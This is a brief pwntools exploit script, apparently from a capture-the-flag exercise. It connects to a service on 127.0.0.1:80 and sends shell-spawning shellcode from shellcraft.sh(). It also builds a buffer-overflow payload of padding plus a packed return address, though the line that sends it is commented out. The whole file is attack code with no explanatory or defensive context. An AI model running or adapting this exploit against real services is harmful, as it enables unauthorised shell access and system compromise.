from pwn import *
import struct
p = remote('127.0.0.1',80)
# p = process('/home/srk/Downloads/pwn')

# p.sendlineafter('name:\n',b'-1')
payload = b'a'*(0x88+4) + p64(0x0400726)
shellcode=asm(shellcraft.sh())
p.sendline(shellcode)
# p.sendline(payload)
p.interactive()